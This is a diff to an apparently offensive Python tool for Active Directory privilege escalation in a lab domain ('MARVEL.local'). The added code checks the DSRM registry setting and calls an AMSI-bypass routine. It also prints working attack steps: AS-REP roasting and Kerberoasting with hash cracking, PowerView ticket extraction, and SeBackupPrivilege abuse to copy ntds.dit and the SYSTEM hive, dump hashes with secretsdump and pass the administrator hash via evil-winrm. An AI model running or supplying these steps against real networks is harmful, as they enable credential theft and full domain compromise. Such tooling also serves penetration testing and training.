@@ -60,8 +60,34 @@ def stepFOUR_PrivilegeEsc():
     except Exception as e:
         print(f"{error} No Writeable service executable FOUND")
     
+    print(f"{warning} C- Check abuse Directory Services Restore Mode (DSRM)")
     time.sleep(1)
-    print(f"\n{warning} C- Check AS-REP Roasting on the domains...")
+    print(f"{ok} Bypassing AMSI Security...\n")
+    #bypass=configurazione()
+    #command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
+    command1=' Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"'
+
+    try:
+        value=powershell_commandLine(command1)
+        value=cleanstring(value)
+        value=value.split("\n")
+        dsrmvalue=99
+        for item in value:
+            if "DsrmAdminLogonBehaviour" in item:
+                dsrmvalue=int(item.split(":")[1].strip())
+                if dsrmvalue!=2:
+                    print(f"{error} Is not possible to allow login into DC using DSRM hash")
+                else:
+                    print(f"{ok} DsrmAdminLogonBehaviour has value 2. It is possible use DSRM hash to login into DC")
+                    x=input(f"{ok} When you finished press ENTER..\n")
+        
+        if dsrmvalue == 99:
+            print(f"{error} DsrmAdminLogonBehaviour not present...")
+    except Exception as e:
+        print(f"{error} General error: {e}")
+
+    time.sleep(1)
+    print(f"\n{warning} D- Check AS-REP Roasting on the domains...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -74,11 +100,13 @@ def stepFOUR_PrivilegeEsc():
         value=value.split("\n")
         if(len(value) == 1):
             print(f"{error} No users with preauthnotrequired FOUND\n")
+           
+        else:
+            print(f"\n{ok} Users with preauthnotrequired FOUND\n")
             print(f"{ok} 1- GETNPUsers MARVEL.local/jsmith -dc-ip=192.168.73.137 ")
             print(f"{ok} 2- Save the password in a file called tgt")
             print(f"{ok} 3- Use John or whatever bruteforce tool to crack password offline: sudo john tgt --wordlist=rockyou")
-        else:
-            print(f"\n{ok} Users with preauthnotrequired FOUND\n")
+            x=input(f"{ok} When you finished press ENTER..\n")
     except Exception as e:
         print(f"{error} General Error: {e}")
 
@@ -100,10 +128,14 @@ def stepFOUR_PrivilegeEsc():
             
         else:
             print(f"\n{ok} Service Account FOUND\n")
+            print(f"{ok} First Way")
+            print(f"{ok} 0- From Kali, if you have already an account in the domain")
             print(f"{ok} 1- GETUserSPN -dc-ip 192.168.73.137 MARVEL.local/(account in the domain) -request ")
             print(f"{ok} 2- Save the TGS encrypted in a file like hash.txt")
             print(f"{ok} 3- hashcat -m 13100 -a 0 hash.txt password --force")
-            print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            x=input(f"{ok} When you finished press ENTER..\n")
+            print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            print(f"{ok} Second Way")
             bypass=configurazione()
             command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
             command1=command0 + 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat '
@@ -116,6 +148,7 @@ def stepFOUR_PrivilegeEsc():
                     print(f"\n{error} No Hashcat TGS FOUND\n")
                 else:
                     print(f"\n{ok} Hashcat TGS FOUND\n")
+                    x=input(f"{ok} When you finished press ENTER..\n")
             except Exception as e:
                 print(f"{error} General Error: {e}")
     except Exception as e:
@@ -150,6 +183,15 @@ def stepFOUR_PrivilegeEsc():
             else:
                 print(f"\n{ok} User in Remote Management Users FOUND\n")
                 print(f"{ok} You can exploit the vulnerability of SeBackupPrivilege to dump ntds.dit and system to get hash")
+                print(f"{ok} A- Get password of this\\these victim account")
+                print(f"{ok} B- From Kali use evil_winrm -i <IP DC> -u <usernameVictim> -p <passwordVictim>")
+                print(f"{ok} C- Use diskshadow in order to copy ntds.dit: diskshadow /s raj.dsh ")
+                print(f"{ok} D- robocopy /b z:\windows\\ntds . ntds.dit")
+                print(f"{ok} E- reg save hklm\\system system")
+                print(f"{ok} F- download ntds.dit and download system")
+                print(f"{ok} G- On kali: Secretdump -ntds ntds.dit -system system local")
+                print(f"{ok} H- On kali: evil_winrm -i <IP DC> -u Administrator -H '<admin hash>'")
+                x=input(f"{ok} When you finished press ENTER..\n")
     except Exception as e:
         print(f"{error} General Error: {e}")
 
@@ -168,8 +210,7 @@ def stepFOUR_PrivilegeEsc():
             if "true" in item:
                 print(f"{ok} This current account has local admin access in ")
 
-    
-    
+
 
 
 
